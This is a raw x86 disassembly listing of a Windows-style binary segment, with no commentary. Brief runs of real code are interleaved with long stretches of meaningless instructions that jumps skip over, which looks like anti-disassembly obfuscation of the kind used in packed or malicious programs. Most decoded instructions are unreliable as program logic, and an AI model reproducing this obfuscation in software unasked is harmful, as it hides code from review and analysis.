  40210f:	dec    eax
  402110:	mov    ebx,0x5c0d4e8c
  402115:	inc    ebx
  402116:	xchg   bh,bh
  402118:	test   eax,0x91a6d08f
  40211d:	(bad)  
  40211f:	adc    al,0x60
  402121:	pop    edi
  402122:	and    dl,BYTE PTR [edi]
  402124:	clc    
  402125:	sbb    DWORD PTR [eax+0x2d],edi
  402128:	(bad)  [edi]
  40212a:	jge    0x4020c8
  40212c:	jo     0x402150
  40212e:	pop    ds
  40212f:	daa    
  402130:	fs add al,0x4a
  402133:	adc    ecx,DWORD PTR [edx+0x1b]
  402136:	and    esi,DWORD PTR [ecx]
  402138:	out    dx,al
  402139:	ret    
  40213a:	into   
  40213b:	jae    0x402191
  40213d:	loop   0x4020fa
  40213f:	pop    eax
  402140:	aad    0x5b
  402142:	add    BYTE PTR [edi-0x6e],0x51
  402146:	rcr    DWORD PTR [edi],cl
  402148:	clc    
  402149:	repnz add al,0x38
  40214c:	jp     0x402145
  40214e:	stos   BYTE PTR es:[edi],al
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	or     eax,0x1e79d529
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021ee
  402176:	ret    
  402177:	das    
  402178:	into   
  402179:	add    ah,BYTE PTR [ecx-0x27]
  40217c:	mov    bl,0x84
  40217e:	dec    ecx
  40217f:	jmp    0xa5ab8346
  402184:	mov    ah,BYTE PTR [eax+0x3b]
  402187:	stos   DWORD PTR es:[edi],eax
  402188:	dec    ebp
  402189:	shl    BYTE PTR [ecx+edi*1],0xc1
  40218d:	sub    al,BYTE PTR [eax+ebx*8]
  402190:	out    dx,al
  402191:	lods   eax,DWORD PTR ds:[esi]
  402192:	adc    eax,0x80a58f16
  402197:	mov    ds,WORD PTR [edi]
  402199:	add    ecx,DWORD PTR [ebx]
  40219b:	mov    ebp,0x48da47a3
  4021a0:	je     0x40216d
  4021a2:	(bad)  
  4021a3:	cmp    eax,0x13b1bbc2
  4021a8:	lea    edx,[esi]
  4021aa:	push   es
  4021ab:	xchg   esp,eax
  4021ac:	dec    esp
  4021ad:	cld    
  4021ae:	daa    
  4021af:	imul   ebp,DWORD PTR [eax+0x13],0x848c4c1c
  4021b6:	jno    0x4021e5
  4021b8:	les    esi,FWORD PTR [esi+edx*2+0x7402c63d]
  4021bf:	in     al,0x19
  4021c1:	vmread DWORD PTR [eax+0x58b5a0b1],esi
  4021c8:	test   eax,0x8bd85186
  4021cd:	in     eax,dx
  4021ce:	ret    
  4021cf:	ret    0xa057
  4021d2:	and    bh,BYTE PTR [esi+0xcc78176]
  4021d8:	mov    ebx,0x26e620ee
  4021dd:	dec    ebx
  4021de:	push   es
  4021df:	data16 int 0x6f
  4021e2:	cmp    dl,BYTE PTR es:[edi]
  4021e5:	js     0x4021a1
  4021e7:	mov    bh,0x1d
  4021e9:	inc    ecx
  4021ea:	repnz sub BYTE PTR [esi],bl
  4021ed:	or     bh,dh
  4021ef:	fsub   st(7),st
  4021f1:	rcr    dl,0x98
  4021f4:	push   eax
  4021f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021f6:	ja     0x40221e
  4021f8:	lahf   
  4021f9:	adc    ch,BYTE PTR [esi+0x55852cfb]
  4021ff:	sbb    al,0x6
  402201:	test   dl,0xd8
  402204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402205:	adc    eax,0xbad71eed
  40220a:	xchg   ebx,eax
  40220b:	xchg   esi,eax
  40220c:	lods   al,BYTE PTR ds:[esi]
  40220d:	cmp    bl,BYTE PTR [ebp+0x63]
  402210:	push   ss
  402211:	cmp    BYTE PTR [eax-0x1bc8f51e],al
  402217:	mov    dl,0xf8
  402219:	add    BYTE PTR [ecx-0x56ed42fe],bl
  40221f:	pop    ds
  402220:	xor    esi,0xb3268276
  402226:	pop    edi
  402227:	or     al,0xa6
  402229:	jns    0x4021e9
  40222b:	cmp    al,0x5d
  40222d:	jecxz  0x402270
  40222f:	stc    
  402230:	aad    0xa
  402232:	push   edx
  402233:	shr    BYTE PTR [edi],1
  402235:	or     al,0x7e
  402237:	inc    ecx
  402238:	(bad)  
  402239:	mov    al,ds:0x9ddc6664
  40223e:	jnp    0x40226e
  402240:	in     al,dx
  402241:	pop    es
  402242:	inc    ebp
  402243:	push   ss
  402244:	int    0x14
  402246:	and    edx,DWORD PTR [ecx-0x50]
  402249:	or     DWORD PTR [ebx+0x13],0x9a396c73
  402250:	sub    ebx,edi
  402252:	test   al,0xf1
  402255:	jecxz  0x402202
  402257:	sbb    al,0x5e
  402259:	sub    ch,BYTE PTR [ebx-0x14]
  40225c:	jge    0x40227d
  40225e:	adc    ecx,DWORD PTR [ebx]
  402260:	int    0x97
  402262:	loop   0x402279
  402264:	mov    esi,0xeb1f84a0
  402269:	ds int3 
  40226b:	sbb    eax,0xacf6124c
  402270:	mov    DWORD PTR [edi+0x6f627e18],ecx
  402276:	mov    esp,0x709d1b3e
  40227b:	sub    eax,0x8f9d78e5
  402280:	or     edi,esi
  402282:	add    ch,BYTE PTR [edx+0x764d39b5]
  402288:	xchg   ebp,eax
  402289:	sbb    ah,BYTE PTR [ecx-0x79]
  40228c:	out    0x35,eax
  40228e:	cdq    
  40228f:	sub    DWORD PTR [edx],edx
  402291:	push   0x9615c572
  402296:	mul    DWORD PTR [edi-0x6b]
  402299:	add    esi,DWORD PTR [eax-0x3d]
  40229c:	addr16 pushf 
  40229e:	mov    BYTE PTR [edi+0x71],ah
  4022a1:	je     0x4022a8
  4022a3:	push   es
  4022a4:	in     al,dx
  4022a5:	cmp    bh,0xf4
  4022a8:	jno    0x4022d3
  4022aa:	push   0x2639d185
  4022af:	rcl    BYTE PTR ds:0x627cefaa,cl
  4022b5:	inc    ebx
  4022b6:	jg     0x40224a
  4022b8:	push   0xc0884503
  4022bd:	arpl   WORD PTR [ebp+0x3d46005c],dx
  4022c3:	test   DWORD PTR [edx+ebx*2-0x2da32bbb],esi
  4022ca:	mov    eax,ds:0x23d30734
  4022cf:	in     al,0x88
  4022d1:	mov    edi,0xe87c01c2
  4022d6:	jle    0x31912d29
  4022dc:	inc    esp
  4022dd:	stos   DWORD PTR es:[edi],eax
  4022de:	dec    edi
  4022df:	pop    esi
  4022e0:	push   esp
  4022e1:	cmp    eax,0x47884dce
  4022e6:	cmp    ebp,esi
  4022e8:	xchg   ebx,eax
  4022e9:	in     al,dx
  4022ea:	jle    0x4022de
  4022ec:	ficomp WORD PTR [esi+esi*4]
  4022ef:	mov    ds:0x4b5f96b7,al
  4022f4:	jecxz  0x4022ee
  4022f6:	sti    
  4022f7:	cli    
  4022f8:	mov    esp,0xe8458b50
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	js     0x402354
  402359:	pop    esi
  40235a:	and    ebx,DWORD PTR [edx-0x58181fd]
  402360:	jg     0x4023e0
  402362:	jle    0x402335
  402364:	jg     0x4023aa
  402366:	cmp    ch,cl
  402368:	and    cl,bl
  40236a:	fsubr  DWORD PTR [ebx+0x687b6510]
  402370:	add    ch,BYTE PTR [esi]
  402372:	mov    cl,0x6
  402374:	push   esi
  402375:	xchg   esi,eax
  402376:	sbb    ah,BYTE PTR [eax+0x71]
  402379:	add    DWORD PTR [ebx-0x16],eax
  40237c:	cmp    dl,BYTE PTR [edi]
  40237e:	push   DWORD PTR [ecx+0x6441b8a2]
  402384:	out    dx,al
  402385:	cs jb  0x4023c3
  402388:	jge    0x40230c
  40238a:	bound  edx,QWORD PTR [ebx+0x6192cc82]
  402390:	mov    ah,0xe
  402392:	xchg   ecx,edi
  402394:	and    al,0xee
  402396:	jp     0x40235c
  402398:	mov    edi,0x3d9a790a
  40239d:	sbb    ch,BYTE PTR [ebx+0xf]
  4023a0:	push   ss
  4023a1:	mov    eax,ds:0x266fe615
  4023a6:	mov    bh,BYTE PTR [edx+ecx*4]
  4023a9:	push   edi
  4023aa:	stos   DWORD PTR es:[edi],eax
  4023ab:	js     0x4023fe
  4023ad:	dec    edx
  4023ae:	jmp    0x402337
  4023b0:	xlat   BYTE PTR ds:[ebx]
  4023b1:	das    
  4023b2:	mov    ds:0x820790f1,al
  4023b7:	aad    0xba
  4023b9:	outs   dx,BYTE PTR ds:[esi]
  4023ba:	es dec ebx
  4023bc:	repz out 0xcc,eax
  4023bf:	mov    esi,esi
  4023c1:	loop   0x402356
  4023c3:	out    dx,eax
  4023c4:	and    dh,bh
  4023c6:	jle    0x40240b
  4023c8:	pop    ecx
  4023c9:	pop    es
  4023ca:	inc    ecx
  4023cb:	and    eax,0xe46a969e
  4023d0:	fistp  DWORD PTR [edi+eiz*2-0x2f236d08]
  4023d7:	ins    DWORD PTR es:[edi],dx
  4023d8:	mov    bh,0x97
  4023da:	test   DWORD PTR [edx+0x4980c03e],0x22cf1d2c
  4023e4:	push   ecx
  4023e5:	inc    ebx
  4023e6:	or     edx,DWORD PTR [ebp+edi*8+0x15]
  4023ea:	arpl   WORD PTR [eax-0x58],cx
  4023ed:	je     0x4023bd
  4023ef:	cmp    bl,BYTE PTR [ebx+0x17]
  4023f2:	inc    eax
  4023f3:	pop    esp
  4023f4:	jmp    0xe0f5d48f
  4023f9:	data16 scas al,BYTE PTR es:[edi]
  4023fb:	pusha  
  4023fc:	shl    BYTE PTR [edx-0x32a47bb9],cl
  402402:	lock fbld TBYTE PTR [eax+0x18]
  402406:	mov    dl,0x2b
  402408:	jne    0x402445
  40240a:	add    al,0x72
  40240c:	jne    0x40245c
  40240e:	dec    ebp
  40240f:	or     eax,DWORD PTR [eax-0x5d]
  402412:	aad    0x7c
  402414:	jno    0x4023c7
  402416:	icebp  
  402417:	scas   eax,DWORD PTR es:[edi]
  402418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402419:	pop    edx
  40241a:	in     al,0x60
  40241c:	repnz fwait
  40241e:	ins    DWORD PTR es:[edi],dx
  40241f:	xor    eax,DWORD PTR [edx]
  402421:	mov    ds:0xd2bdf871,al
  402426:	(bad)  
  402427:	fwait
  402428:	imul   ebx,DWORD PTR [eax],0x7195265c
  40242e:	popf   
  40242f:	xchg   esp,eax
  402430:	retf   0x4963
  402433:	xor    esp,esp
  402435:	fucom  st(5)
  402437:	push   ecx
  402438:	mov    al,0x86
  40243a:	out    dx,eax
  40243b:	sub    ecx,esp
  40243d:	inc    ecx
  40243e:	or     dh,dl
  402440:	nop
  402441:	sbb    al,0x95
  402443:	sub    DWORD PTR [ebx],eax
  402445:	ret    
  402446:	xchg   edx,eax
  402447:	or     eax,0x64f56e36
  40244c:	pop    edx
  40244d:	dec    esp
  40244e:	js     0x4024cc
  402450:	dec    esp
  402451:	inc    ebp
  402452:	sahf   
  402453:	inc    edx
  402454:	pusha  
  402455:	(bad)  ds:0x2f447eaa
  40245b:	into   
  40245c:	loope  0x402484
  40245e:	shl    DWORD PTR [edi],0x6e
  402461:	call   0xbb9c79e8
  402466:	or     DWORD PTR [edi-0x1044837f],ebp
  40246c:	idiv   BYTE PTR [ebp+0x5a5cdaf7]
  402472:	or     DWORD PTR [ebp-0x79],eax
  402475:	bound  ebx,QWORD PTR [edi+0x1e]
  402478:	inc    ebx
  402479:	push   ebp
  40247a:	dec    cx
  40247c:	sbb    dh,cl
  40247e:	in     al,dx
  40247f:	dec    eax
  402480:	mov    DWORD PTR [esi-0x68],ecx
  402483:	pop    esi
  402484:	inc    esi
  402485:	cmp    al,0xf0
  402487:	pop    esi
  402488:	int    0xab
  40248a:	sub    DWORD PTR [ecx+ecx*4],esi
  40248d:	adc    bl,BYTE PTR [edi-0x1f]
  402490:	mov    eax,0x5639d50c
  402495:	test   BYTE PTR [ebp+0x76a83162],dl
  40249b:	push   ss
  40249c:	xor    DWORD PTR ds:0x62061c55,edx
  4024a2:	adc    eax,DWORD PTR [ebp-0x2ea20bac]
  4024a8:	cmp    al,0x7d
  4024aa:	jl     0x4024f2
  4024ac:	popf   
  4024ad:	not    BYTE PTR [edx+esi*1]
  4024b0:	cmc    
  4024b1:	or     ah,BYTE PTR ds:0x73d45a92
  4024b7:	mov    ch,0x27
  4024b9:	mov    bl,0x4
  4024bb:	iret   
  4024bc:	and    eax,0x664cb28b
  4024c1:	js     0x4024b6
  4024c3:	daa    
  4024c4:	call   0xb4dc:0x9c9af5f4
  4024cb:	jmp    0x98c0:0xc9d0951e
  4024d2:	enter  0xc68d,0x3d
  4024d6:	adc    BYTE PTR [ecx],0x6d
  4024d9:	adc    al,0xea
  4024db:	jo     0x402485
  4024dd:	fst    QWORD PTR [edx]
  4024df:	cld    
  4024e0:	sbb    BYTE PTR [ebp-0x3d],dl
  4024e3:	int3   
  4024e4:	cmp    esp,DWORD PTR [ebx+edi*4-0x760fba75]
  4024eb:	inc    ebp
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	sub    al,0x13
  40250f:	mov    eax,0x7e012625
  402514:	jle    0x402510
  402516:	jg     0x402596
  402518:	jle    0x402521
  40251a:	fwait
  40251b:	sub    DWORD PTR [eax+0x23],ebx
  40251e:	or     DWORD PTR [edi+0x6a7464c6],ebp
  402524:	jae    0x4024cc
  402526:	lods   al,BYTE PTR ds:[esi]
  402527:	push   0xaced07c8
  40252c:	and    bl,BYTE PTR [edi]
  40252e:	fcomp  QWORD PTR [edx]
  402530:	pop    esi
  402531:	add    cl,BYTE PTR [bx+si-0x485f]
  402536:	ins    DWORD PTR es:[edi],dx
  402537:	mov    al,0x2a
  402539:	(bad)  
  40253a:	retf   
  40253b:	neg    BYTE PTR [ecx-0x3f4e447b]
  402541:	mov    ah,0xbe
  402543:	popf   
  402544:	mov    eax,0xd69428a3
  402549:	mov    dl,0xc7
  40254b:	loope  0x40253c
  40254d:	cmp    ebx,ebp
  40254f:	imul   esp,DWORD PTR [edx],0xf73074f7
  402555:	pop    ebp
  402556:	(bad)  
  402557:	fisttp DWORD PTR [esi+edi*2-0x57]
  40255b:	cli    
  40255c:	mov    bh,BYTE PTR [edx]
  40255e:	icebp  
  40255f:	and    eax,0xa441bd5f
  402564:	(bad)  
  402565:	jbe    0x4025e4
  402567:	xchg   DWORD PTR [eax-0x13],ebp
  40256a:	in     eax,0xa3
  40256c:	push   ebx
  40256d:	mov    ch,0x63
  40256f:	add    al,0xe0
  402571:	xor    dh,BYTE PTR [ebp+ebx*2-0x7c89f4f7]
  402578:	es xchg ebx,eax
  40257a:	mov    edi,0x941ba3ae
  40257f:	sub    edi,0x9b104e4b
  402585:	mov    esi,0xab823cf8
  40258a:	add    DWORD PTR ds:0x969b17e9,0x26
  402591:	mul    DWORD PTR [ebx+0x73d6fff8]
  402597:	leave  
  402598:	lds    ecx,FWORD PTR [edi-0x1149b18b]
  40259e:	aam    0xe0
  4025a0:	test   eax,0x6402c0e9
  4025a5:	ja     0x4025c4
  4025a7:	adc    DWORD PTR [esi+esi*8+0x59],0xfffffff4
  4025ac:	aas    
  4025ad:	push   esi
  4025ae:	daa    
  4025af:	popa   
  4025b0:	int    0x1d
  4025b2:	aam    0x46
  4025b4:	pop    ecx
  4025b5:	adc    BYTE PTR [ebx+0xb4669b0],bl
  4025bb:	dec    ecx
  4025bc:	iret   
  4025bd:	pop    ebx
  4025be:	rol    DWORD PTR [ecx+0x78e530e5],0xd
  4025c5:	mov    ds:0x3a529bb9,al
  4025ca:	retf   0xa629
  4025cd:	leave  
  4025ce:	into   
  4025cf:	mov    cl,0xf2
  4025d1:	and    ch,ah
  4025d3:	repnz sub BYTE PTR [esi],0x1
  4025d7:	sub    esi,ebp
  4025d9:	jne    0x402616
  4025db:	enter  0x725d,0xba
  4025df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025e0:	aaa    
  4025e1:	mov    ds:0x53dc5e6,al
  4025e6:	push   ebx
  4025e7:	out    0x4d,al
  4025e9:	call   0x1e306f14
  4025ee:	pusha  
  4025ef:	pop    ebp
  4025f0:	dec    eax
  4025f1:	aas    
  4025f2:	stos   DWORD PTR es:[edi],eax
  4025f3:	adc    eax,0x5c3fd663
  4025f8:	cmp    BYTE PTR [edx+0x6d],ah
  4025fb:	mov    DWORD PTR ds:0x8d640377,ecx
  402601:	dec    ebx
  402602:	test   BYTE PTR [eax-0x55d3f205],al
  402608:	pop    esp
  402609:	aad    0x96
  40260b:	dec    esp
  40260c:	pop    ebx
  40260d:	pop    edi
  40260e:	mov    eax,ds:0x94e091c2
  402613:	xchg   BYTE PTR [ebp-0x724c91d9],bh
  402619:	lods   al,BYTE PTR ds:[esi]
  40261a:	xchg   esi,eax
  40261b:	fcmovbe st,st(7)
  40261d:	push   0xffffffe0
  40261f:	sub    bh,BYTE PTR [ebp+esi*1+0x4e]
  402623:	sub    al,0x48
  402625:	rol    BYTE PTR [edx-0x6f592f0e],1
  40262b:	push   edi
  40262c:	mov    bh,0x34
  40262e:	add    ecx,ecx
  402630:	test   al,0x2b
  402632:	shr    BYTE PTR [ecx+edi*2-0x12],1
  402636:	cli    
  402637:	imul   ebp,DWORD PTR [ebp-0x6f],0x4b
  40263b:	je     0x40264d
  40263d:	fiadd  WORD PTR [ebp-0x7dd08be8]
  402643:	lea    edx,[eax+eiz*8-0x79]
  402647:	and    BYTE PTR [ecx-0xc2883c3],ah
  40264d:	mov    dh,0xf9
  40264f:	aaa    
  402650:	retf   0x5af6
  402653:	push   edi
  402654:	lods   eax,DWORD PTR ds:[esi]
  402655:	sub    bl,dh
  402657:	add    BYTE PTR [eax+0x4c],0xac
  40265b:	out    dx,eax
  40265c:	push   0x804914a8
  402661:	jp     0x402601
  402663:	out    dx,al
  402664:	add    BYTE PTR [ecx],dh
  402666:	out    0xfd,al
  402668:	lds    esp,FWORD PTR [ebx+0x60]
  40266b:	(bad)  
  40266d:	mov    dh,BYTE PTR [edx+0x591771d6]
  402673:	lds    ebp,FWORD PTR [edx+0x7aeae615]
  402679:	and    al,0x7c
  40267b:	mov    ch,0x97
  40267d:	xchg   ebx,eax
  40267e:	sahf   
  40267f:	mov    edi,0xaf493e4b
  402684:	test   DWORD PTR [edi],edx
  402686:	call   0xdaef:0x3565669
  40268d:	aaa    
  40268e:	addr16 in eax,dx
  402690:	mov    WORD PTR [esp+ebx*2-0x2c0647ce],?
  402697:	mov    al,ds:0xd41c7be1
  40269c:	inc    ecx
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	sub    al,BYTE PTR ds:0xea2ec6e
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026be
  4026df:	pop    ss
  4026e0:	mov    al,0xa7
  4026e2:	test   eax,0x760e99f2
  4026e7:	imul   esi,ebp,0x225a8060
  4026ed:	ins    DWORD PTR es:[edi],dx
  4026ee:	mov    cl,0xa6
  4026f0:	inc    edi
  4026f1:	and    eax,0x139c69df
  4026f6:	ds test al,0xb9
  4026f9:	pusha  
  4026fa:	retf   0xefa9
  4026fd:	sbb    DWORD PTR [ecx],ecx
  4026ff:	mov    BYTE PTR [eax+0x65],ah
  402702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402703:	cwde   
  402704:	cdq    
  402705:	ret    
  402706:	mov    dl,0x41
  402708:	mov    edi,0x36fe6413
  40270d:	mov    ecx,0x1b82942b
  402712:	loop   0x40273b
  402714:	xchg   edx,eax
  402715:	into   
  402716:	rcr    BYTE PTR [ebp-0x75d2c759],cl
  40271c:	addr16 dec ecx
  40271e:	rcl    DWORD PTR [ecx],cl
  402720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402721:	fstp   TBYTE PTR [esp+ebx*1]
  402724:	enter  0xc72,0x96
  402728:	hlt    
  402729:	mov    gs,WORD PTR [ebx]
  40272b:	hlt    
  40272c:	cmp    esi,ebp
  40272e:	jae    0x4026e4
  402730:	pusha  
  402731:	add    ebp,ebx
  402733:	adc    ch,cl
  402735:	je     0x402712
  402737:	inc    eax
  402738:	gs mov cl,0x45
  40273b:	inc    edi
  40273c:	in     al,dx
  40273d:	je     0x402773
  40273f:	bnd jo 0x40278f
  402742:	push   ss
  402743:	pop    ebp
  402744:	scas   eax,DWORD PTR es:[edi]
  402745:	das    
  402746:	dec    ecx
  402747:	sbb    BYTE PTR [edi+eax*2+0x4e76dc35],ah
  40274e:	pop    edi
  40274f:	and    esp,ebx
  402751:	popa   
  402752:	pop    ss
  402753:	cmp    DWORD PTR [ecx-0x1e7f03b1],edx
  402759:	loopne 0x4027ac
  40275b:	xchg   ecx,eax
  40275c:	pusha  
  40275d:	cmp    eax,0xb504306b
  402762:	xlat   BYTE PTR ds:[ebx]
  402763:	jmp    0x4c7a599d
  402768:	pop    esp
  402769:	mov    esp,0xa145f202
  40276e:	and    al,0x29
  402770:	mov    eax,ds:0xf8db9ade
  402775:	js     0x4027ae
  402777:	aaa    
  402778:	out    0x94,al
  40277a:	mov    WORD PTR [ecx*1+0x6d1e58b7],gs
  402781:	sbb    esp,DWORD PTR [esi]
  402783:	inc    ecx
  402784:	aaa    
  402785:	sbb    dl,BYTE PTR [eax+esi*8+0x39402c96]
  40278c:	xlat   BYTE PTR ds:[ebx]
  40278d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40278e:	(bad)  
  40278f:	cwde   
  402790:	test   BYTE PTR [edi-0x13b6ab27],dh
  402796:	mov    cs,WORD PTR [edi]
  402798:	pushf  
  402799:	mov    edx,0x601e7cec
  40279e:	push   0xffffff8b
  4027a0:	inc    edx
  4027a1:	dec    esi
  4027a2:	mov    edx,0x3260d8e
  4027a7:	pop    ds
  4027a8:	leave  
  4027a9:	lods   al,BYTE PTR ds:[esi]
  4027aa:	fstp   DWORD PTR [ecx+0x5b18b05]
  4027b0:	cmp    eax,0x29a7841d
  4027b5:	iret   
  4027b6:	sub    esi,DWORD PTR [ecx-0x5c]
  4027b9:	push   esp
  4027ba:	ret    0xb211
  4027bd:	icebp  
  4027be:	lods   eax,DWORD PTR ds:[esi]
  4027bf:	jbe    0x40275d
  4027c1:	pop    ds
  4027c2:	outs   dx,BYTE PTR ds:[esi]
  4027c3:	add    DWORD PTR [edx+0x7327985c],ebp
  4027c9:	dec    ebp
  4027ca:	lds    edi,FWORD PTR [ebx-0x70]
  4027cd:	xor    eax,0x3e8f5e0e
  4027d2:	push   ds
  4027d3:	bound  eax,QWORD PTR [ecx-0x6192c769]
  4027d9:	push   0x74
  4027db:	dec    ebx
  4027dc:	dec    eax
  4027dd:	adc    al,0xd2
  4027df:	xchg   esp,eax
  4027e0:	add    DWORD PTR ds:0x868fcf0a,esp
  4027e6:	xchg   esp,eax
  4027e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027e8:	ins    DWORD PTR es:[edi],dx
  4027e9:	cmp    BYTE PTR [edi],al
  4027eb:	in     eax,dx
  4027ec:	mov    eax,DWORD PTR [ebx-0x474e9dc4]
  4027f2:	mov    dh,0x3f
  4027f4:	outs   dx,DWORD PTR ds:[esi]
  4027f5:	ror    ah,0x88
  4027f8:	inc    ecx
  4027f9:	pop    edx
  4027fa:	cwde   
  4027fb:	cld    
  4027fc:	(bad)  
  4027fd:	das    
  4027fe:	(bad)  
  4027ff:	cs dec eax
  402801:	in     al,0xa4
  402803:	inc    ebx
  402804:	retf   0xd1a2
  402807:	fstp   DWORD PTR [edi]
  402809:	retf   
  40280a:	shl    DWORD PTR [edi],1
  40280c:	jmp    0x7f1a36f8
  402811:	leave  
  402812:	dec    ecx
  402813:	xchg   ebx,eax
  402814:	or     eax,0x4dcfb34f
  402819:	jno    0x402850
  40281b:	adc    DWORD PTR [edx+0x62],edx
  40281e:	call   0x7f370aa4
  402823:	test   al,0xc
  402825:	push   ecx
  402826:	and    DWORD PTR [esi],0xffffff96
  402829:	dec    edi
  40282a:	test   al,0xe5
  40282c:	aad    0xd
  40282e:	xor    eax,0x250ae09a
  402833:	push   edx
  402834:	shl    BYTE PTR [edx+0x75],1
  402837:	xor    al,0xda
  402839:	mov    edi,0x59a1dbc5
  40283e:	cld    
  40283f:	into   
  402840:	and    dh,BYTE PTR [ecx+0x22]
  402843:	inc    ebx
  402844:	cmc    
  402845:	fimul  DWORD PTR [edx-0x1f4ff501]
  40284b:	or     edi,DWORD PTR [eax-0x1]
  40284e:	pop    ebx
  40284f:	xor    BYTE PTR [edx],cl
  402851:	shl    ah,cl
  402853:	sbb    eax,DWORD PTR [ebp-0xc]
  402856:	out    dx,al
  402857:	hlt    
  402858:	and    al,0x3
  40285a:	les    edi,FWORD PTR [edi+edi*1]
  40285d:	daa    
  40285e:	stos   BYTE PTR es:[edi],al
  40285f:	in     al,dx
  402860:	nop
  402861:	xchg   esi,eax
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	fs pop ecx
  402885:	leave  
  402886:	cmc    
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402889
  402890:	push   es
  402891:	ja     0x402827
  402893:	and    DWORD PTR [esi],ebp
  402895:	adc    BYTE PTR [eax+0x740cac51],cl
  40289b:	int3   
  40289c:	popa   
  40289d:	jno    0x4028bf
  40289f:	mov    ebx,0x24c7e7df
  4028a4:	fnstcw WORD PTR [eax]
  4028a6:	push   ebx
  4028a7:	jno    0x4028bc
  4028a9:	pop    ds
  4028aa:	(bad)  
  4028ab:	out    0x47,al
  4028ad:	mov    eax,ds:0xdb1d13dc
  4028b2:	jno    0x4028a1
  4028b4:	mov    ds:0x557a7669,eax
  4028b9:	xchg   edx,eax
  4028ba:	pop    ebx
  4028bb:	mov    esp,0xaef57c17
  4028c0:	loop   0x40285c
  4028c2:	push   cs
  4028c3:	cmp    edi,DWORD PTR [ebx-0x8]
  4028c6:	loope  0x402916
  4028c8:	and    DWORD PTR ds:0x1b07b7f4,ecx
  4028ce:	fwait
  4028cf:	jae    0x402881
  4028d1:	xchg   edi,eax
  4028d2:	adc    BYTE PTR [edx+edi*8],0x52
  4028d6:	jo     0x40294a
  4028d8:	and    eax,0x5ed704fa
  4028dd:	xchg   ecx,eax
  4028de:	jb     0x40289d
  4028e0:	inc    ebx
  4028e1:	cwde   
  4028e2:	mov    cl,0x5d
  4028e4:	stos   DWORD PTR es:[edi],eax
  4028e5:	push   esp
  4028e6:	push   eax
  4028e7:	in     eax,0x2e
  4028e9:	add    ah,bh
  4028eb:	cmp    DWORD PTR [ecx],ebx
  4028ed:	daa    
  4028ee:	pop    eax
  4028ef:	add    eax,0x489f2f31
  4028f4:	call   0xd1ff50aa
  4028f9:	push   esp
  4028fa:	sbb    esi,DWORD PTR [ebp+0xbcbc903]
  402900:	push   cs
  402901:	in     eax,0x81
